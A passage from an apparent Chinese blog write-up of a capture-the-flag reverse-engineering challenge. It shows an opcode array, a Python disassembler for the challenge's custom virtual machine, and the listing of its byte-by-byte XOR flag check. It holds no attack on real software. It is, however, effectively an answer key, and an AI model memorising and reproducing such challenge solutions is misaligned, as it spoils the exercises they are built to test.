class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1B</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x55</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1C</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x19</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0xB3</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1E</span>, <span class="number">0xB1</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x4B</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x1F</span>, <span class="number">0xB2</span>, <span class="number">0x77</span>, <span class="number">0xC2</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xC1</span>, <span class="number">0x20</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x21</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0xF1</span>, <span class="number">0x98</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x20</span>, <span class="number">0xB9</span>, <span class="number">0xE4</span>, <span class="number">0x35</span>, <span class="number">0x31</span>, <span class="number">0x77</span>, <span class="number">0x10</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x77</span>, <span class="number">0xA0</span>, <span class="number">0xC1</span>, <span class="number">0x24</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x25</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x26</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x27</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC7</span>, <span class="number">0xC1</span>, <span class="number">0x28</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x18</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x10</span>, <span class="number">0xC1</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2A</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0xF7</span>, <span class="number">0xC1</span>, <span class="number">0x2B</span>, <span class="number">0xF7</span>, <span class="number">0xFE</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x10</span>, <span class="number">0x32</span>, <span class="number">0x20</span>, <span class="number">0x43</span>, <span class="number">0x33</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x22</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x80</span>, <span class="number">0x02</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0xC8</span>, <span class="number">0x99</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_asm</span>(<span class="params">reg</span>):<span class="comment"># 这里写成python语法方便爆破</span></span><br><span class="line">    now = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        opcode = reg[now]</span><br><span class="line">        <span class="keyword">if</span> opcode == <span class="number">113</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;push <span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">2</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">3</span>]&#125;</span>,<span class="subst">&#123;reg[now+<span class="number">4</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">65</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1+=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">66</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1-=reg4&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">67</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1*=reg3&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">55</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">56</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg4&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">57</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">53</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg5=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xF7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9+=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">68</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1/=reg5&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x80</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>= <span class="subst">&#123;<span class="built_in">int</span>.from_bytes(<span class="built_in">bytes</span>(reg[now + <span class="number">2</span>:now + <span class="number">6</span>]), <span class="string">&#x27;little&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">6</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x77</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1^=reg9&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x53</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;pop [reg3]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x22</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&gt;&gt;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x23</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&lt;&lt;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x99</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x76</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;r3 = [r6]&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[r6] = 0&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;r6 += 4&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x54</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;read [reg3]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x30</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1|=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x31</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1&amp;=reg2&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;r3 = <span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">9</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=1877735783&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x10</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x33</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg4=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x34</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg2=<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xFE</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg1=reg9&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0x11</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;printf &#x27;%x\\n&#x27;, reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;cmp reg1=1877735783&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;read 0, s, 0x2Cu&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;cmp strlen(s), 44&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg9=<span class="subst">&#123;fog[<span class="number">0</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg9=<span class="subst">&#123;fog[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xA4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;fog[<span class="subst">&#123;now&#125;</span>]=reg1&quot;</span>)</span><br><span class="line">            now += <span class="number">4</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB3</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=fog[2]&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xB4</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;reg9=fog[3]&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;reg1=s[<span class="subst">&#123;reg[now+<span class="number">1</span>]&#125;</span>]&quot;</span>)</span><br><span class="line">            now += <span class="number">2</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC7</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;cmp <span class="subst">&#123;exit_door[<span class="number">0</span>]&#125;</span>, reg1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;cmp <span class="subst">&#123;exit_door[<span class="number">1</span>]&#125;</span>, reg1&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;jne exit&quot;</span>)</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> opcode == <span class="number">0xC2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;exit if now!=r1&quot;</span>)</span><br><span class="line">            now += <span class="number">5</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">print_asm(opcode)</span><br></pre></td></tr></table></figure><p>这个变量没有命好名。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line">read 0, s, 0x2Cu</span><br><span class="line">cmp strlen(s), 44</span><br><span class="line">jne exit</span><br><span class="line">reg1=s[0]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 74!=r1</span><br><span class="line">reg1=s[1]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[2]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 221!=r1</span><br><span class="line">reg1=s[3]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 15!=r1</span><br><span class="line">reg1=s[4]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 27!=r1</span><br><span class="line">reg1=s[5]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 137!=r1</span><br><span class="line">reg1=s[6]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[7]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 84!=r1</span><br><span class="line">reg1=s[8]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 79!=r1</span><br><span class="line">reg1=s[9]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 78!=r1</span><br><span class="line">reg1=s[10]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 85!=r1</span><br><span class="line">reg1=s[11]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 86!=r1</span><br><span class="line">reg1=s[12]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 142!=r1</span><br><span class="line">reg1=s[13]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 73!=r1</span><br><span class="line">reg1=s[14]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 14!=r1</span><br><span class="line">reg1=s[15]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 75!=r1</span><br><span class="line">reg1=s[16]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 6!=r1</span><br><span class="line">reg1=s[17]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 84!=r1</span><br><span class="line">reg1=s[18]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 26!=r1</span><br><span class="line">reg1=s[19]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 66!=r1</span><br><span class="line">reg1=s[20]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 83!=r1</span><br><span class="line">reg1=s[21]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 31!=r1</span><br><span class="line">reg1=s[22]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 82!=r1</span><br><span class="line">reg1=s[23]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 219!=r1</span><br><span class="line">reg1=s[24]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[25]</span><br><span class="line">reg9=fog[3]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 217!=r1</span><br><span class="line">reg1=s[26]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[27]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 85!=r1</span><br><span class="line">reg1=s[28]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 25!=r1</span><br><span class="line">reg1=s[29]</span><br><span class="line">reg9=fog[2]</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 0!=r1</span><br><span class="line">reg1=s[30]</span><br><span class="line">reg9=123</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 75!=r1</span><br><span class="line">reg1=s[31]</span><br><span class="line">reg9=47</span><br><span class="line">reg1^=reg9</span><br><span class="line">exit if 30!=r1</span><br><span class="line">reg1=s[32]</span><br><span class="line">reg2= 24</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9=reg1</span><br><span class="line">reg1=s[33]</span><br><span class="line">reg2= 16</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[34]</span><br><span class="line">reg2= 8</span><br><span class="line">reg1&lt;&lt;=reg2</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=s[35]</span><br><span class="line">reg9+=reg1</span><br><span class="line">reg1=reg9</span><br><span 